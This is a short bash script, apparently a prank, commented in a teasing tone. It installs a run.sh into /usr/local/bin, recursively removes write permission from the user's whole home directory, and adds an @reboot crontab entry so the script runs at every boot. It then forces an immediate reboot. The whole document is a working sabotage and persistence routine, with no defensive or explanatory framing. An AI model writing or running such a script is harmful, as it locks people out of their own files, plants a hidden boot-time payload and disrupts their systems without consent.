#!/bin/bash

# where it belongs :3
DEST_DIR="/usr/local/bin"

# funni
cp /home/$(whoami)/run.sh $DEST_DIR/run.sh

# funni round 2
chmod +x $DEST_DIR/run.sh

# funni round 3
chmod -R a-w /home/$(whoami)

# complete disaster
(crontab -l 2>/dev/null; echo "@reboot /bin/bash $DEST_DIR/run.sh") | crontab -

# bye-bye sweetheart~
shutdown -r now
